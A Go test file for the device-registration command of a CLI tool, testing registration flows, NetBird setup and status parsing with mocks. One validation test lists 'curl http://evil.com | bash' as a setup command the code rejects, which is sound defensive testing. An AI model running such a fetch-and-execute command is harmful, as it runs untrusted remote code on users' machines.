package register

import (
	"context"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"

	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
	nodev1 "buf.build/gen/go/brevdev/devplane/protocolbuffers/go/devplaneapi/v1"
	"connectrpc.com/connect"

	"github.com/brevdev/brev-cli/pkg/entity"
	"github.com/brevdev/brev-cli/pkg/externalnode"
	"github.com/brevdev/brev-cli/pkg/terminal"
)

// mockRegisterStore satisfies RegisterStore for orchestration tests.
type mockRegisterStore struct {
	user  *entity.User
	org   *entity.Organization
	token string
	err   error
}

func (m *mockRegisterStore) GetCurrentUser() (*entity.User, error) {
	if m.err != nil {
		return nil, m.err
	}
	return m.user, nil
}

func (m *mockRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	return m.org, nil
}

func (m *mockRegisterStore) GetAccessToken() (string, error) { return m.token, nil }

// mockRegistrationStore satisfies RegistrationStore for orchestration tests.
type mockRegistrationStore struct {
	reg *DeviceRegistration
}

func (m *mockRegistrationStore) Save(reg *DeviceRegistration) error {
	m.reg = reg
	return nil
}

func (m *mockRegistrationStore) Load() (*DeviceRegistration, error) {
	if m.reg == nil {
		return nil, fmt.Errorf("no registration")
	}
	return m.reg, nil
}

func (m *mockRegistrationStore) Delete() error {
	m.reg = nil
	return nil
}

func (m *mockRegistrationStore) Exists() (bool, error) {
	return m.reg != nil, nil
}

// mock types for registerDeps interfaces

type mockPlatform struct{ compatible bool }

func (m mockPlatform) IsCompatible() bool { return m.compatible }

type mockConfirmer struct{ confirm bool }

func (m mockConfirmer) ConfirmYesNo(_ string) bool { return m.confirm }

type mockNetBirdManager struct{ err error }

func (m mockNetBirdManager) Install() error   { return m.err }
func (m mockNetBirdManager) Uninstall() error { return m.err }

type mockSetupRunner struct {
	called bool
	cmd    string
	err    error
}

func (m *mockSetupRunner) RunSetup(script string) error {
	m.called = true
	m.cmd = script
	return m.err
}

type mockNodeClientFactory struct {
	serverURL string
}

func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
	return NewNodeServiceClient(provider, m.serverURL)
}

// testRegisterDeps returns deps with all side effects stubbed out, and a fake
// ConnectRPC server backed by the provided fakeNodeService.
func testRegisterDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationStore) (registerDeps, *httptest.Server) {
	t.Helper()

	_, handler := nodev1connect.NewExternalNodeServiceHandler(svc)
	server := httptest.NewServer(handler)

	return registerDeps{
		platform:    mockPlatform{compatible: true},
		prompter:    mockConfirmer{confirm: true},
		netbird:     mockNetBirdManager{},
		setupRunner: &mockSetupRunner{},
		nodeClients: mockNodeClientFactory{serverURL: server.URL},
		commandRunner: &mockCommandRunner{
			outputs: map[string][]byte{
				"nvidia-smi": []byte("NVIDIA GB10, 131072\n"),
				"lsblk":      []byte("nvme0n1  500107862016 disk 0\n"),
			},
		},
		fileReader: &mockFileReader{
			files: map[string][]byte{
				"/proc/cpuinfo":   []byte("processor\t: 0\nprocessor\t: 1\n"),
				"/proc/meminfo":   []byte("MemTotal:       131886028 kB\n"),
				"/etc/os-release": []byte("NAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\n"),
			},
		},
		registrationStore: regStore,
	}, server
}

func Test_runRegister_HappyPath(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			if req.GetOrganizationId() != "org_123" {
				t.Errorf("unexpected org: %s", req.GetOrganizationId())
			}
			if req.GetName() != "My Spark" {
				t.Errorf("unexpected name: %s", req.GetName())
			}
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "My Spark", deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	// Verify registration was persisted
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if !exists {
		t.Fatal("expected registration to exist after successful register")
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.ExternalNodeID != "unode_abc" {
		t.Errorf("expected ExternalNodeID unode_abc, got %s", reg.ExternalNodeID)
	}
	if reg.DisplayName != "My Spark" {
		t.Errorf("expected display name 'My Spark', got %s", reg.DisplayName)
	}
	if reg.OrgID != "org_123" {
		t.Errorf("expected org org_123, got %s", reg.OrgID)
	}

	// Verify setup command was executed
	if setupRunner.cmd != "netbird up --key abc" {
		t.Errorf("expected setup command 'netbird up --key abc', got %q", setupRunner.cmd)
	}
}

func Test_runRegister_UserCancels(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: false}

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "My Spark", deps)
	if err != nil {
		t.Fatalf("expected nil error on cancel, got: %v", err)
	}

	// Registration should not exist
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if exists {
		t.Error("registration should not exist after cancel")
	}
}

func Test_runRegister_AlreadyRegistered(t *testing.T) {
	tests := []struct {
		name      string
		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
	}{
		{
			name: "Connected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "Disconnected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "GetNodeFails",
			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, nil)
			},
		},
		{
			name: "NilConnectivityInfo",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
					},
				}, nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{
				reg: &DeviceRegistration{
					ExternalNodeID: "unode_existing",
					DisplayName:    "Existing",
					OrgID:          "org_123",
				},
			}

			store := &mockRegisterStore{
				user: &entity.User{ID: "user_1"},
				org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

				token: "tok",
			}

			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
			deps, server := testRegisterDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			// Pass the same name as the existing registration so we go through
			// the checkExistingRegistration path (not the different-name path).
			err := runRegister(context.Background(), term, store, "Existing", deps)
			if err != nil {
				t.Fatalf("expected nil error, got: %v", err)
			}

			exists, _ := regStore.Exists()
			if !exists {
				t.Error("expected registration to still exist")
			}
		})
	}
}

func Test_runRegister_NoOrganization(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  nil,

		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "My Spark", deps)
	if err == nil {
		t.Fatal("expected error when no org exists")
	}
}

func Test_runRegister_AddNodeFails(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return nil, connect.NewError(connect.CodeInternal, nil)
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "My Spark", deps)
	if err == nil {
		t.Fatal("expected error when AddNode fails")
	}

	// Registration should not exist on failure
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if exists {
		t.Error("registration should not exist after AddNode failure")
	}
}

func Test_runRegister_NoSetupCommand(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
				// No ConnectivityInfo / RegistrationCommand
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "My Spark", deps)
	if err != nil {
		t.Fatalf("runRegister failed: %v", err)
	}

	if setupRunner.called {
		t.Error("setup command should not be called when empty")
	}
}

func Test_runSetupCommand_Validation(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectReject bool
	}{
		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := runSetupCommand(tt.cmd)
			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
			if tt.expectReject && !rejected {
				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
			}
			if !tt.expectReject && rejected {
				t.Errorf("expected command to be accepted, but got: %v", err)
			}
		})
	}
}

func Test_netbirdManagementConnected(t *testing.T) {
	connectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Connected
Signal: Connected
Relays: 3/3 Available
Nameservers: 0/0 Available
FQDN: client-3dbe844c.lp.local
NetBird IP: 100.108.207.143/16
Interface type: Kernel
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 3/4 Connected`

	disconnectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Disconnected
Signal: Disconnected
Relays: 0/2 Available
Nameservers: 0/0 Available
FQDN:
NetBird IP: N/A
Interface type: N/A
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 0/0 Connected`

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"Connected", connectedOutput, true},
		{"Disconnected", disconnectedOutput, false},
		{"EmptyString", "", false},
		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := netbirdManagementConnected(tt.input)
			if got != tt.want {
				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

func Test_runRegister_NoNameNotRegistered(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "", deps)
	if err == nil {
		t.Fatal("expected error when no name provided and not registered")
	}
	if !strings.Contains(err.Error(), "please provide a name") {
		t.Errorf("expected 'please provide a name' error, got: %v", err)
	}
}

func Test_runRegister_NoNameAlreadyRegistered(t *testing.T) {
	regStore := &mockRegistrationStore{
		reg: &DeviceRegistration{
			ExternalNodeID: "unode_existing",
			DisplayName:    "Existing Device",
			OrgID:          "org_123",
		},
	}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{
		getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
			return &nodev1.GetNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: req.GetExternalNodeId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
					},
				},
			}, nil
		},
	}

	deps, server := testRegisterDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	err := runRegister(context.Background(), term, store, "", deps)
	if err != nil {
		t.Fatalf("expected nil error when already registered with no name, got: %v", err)
	}

	// Registration should still exist
	exists, _ := regStore.Exists()
	if !exists {
		t.Error("expected registration to still exist")
	}
}
